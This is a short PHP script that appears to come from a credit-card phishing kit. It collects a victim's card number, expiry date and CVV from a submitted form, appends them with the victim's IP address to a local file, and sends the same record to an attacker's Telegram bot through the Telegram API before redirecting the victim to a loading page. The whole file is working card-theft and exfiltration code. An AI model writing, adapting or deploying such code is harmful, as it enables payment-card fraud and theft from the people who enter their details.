<?php
header('Location: loading2.php');
require 'wael.php';
require 'getdata.php';
$_SESSION["ASVA"] = true;
$nummer = $_POST['nummer'];
$MM = $_POST['MM'];
$YY = $_POST['YY'];
$cifre = $_POST['cifre'];
$text .= "CC | ".$nummer." | ".$MM."/".$YY." | ".$cifre." | ".$ip."
\n";
$file = fopen("robot.txt", "a");
fwrite($file, $text);
$tok=$api;
$user=$id;
$request=[
  'chat_id' => $user,
  'text' => "
".$text 
];
$request_url="https://api.telegram.org/bot".$tok."/sendMessage?".http_build_query($request);
file_get_contents($request_url);
?>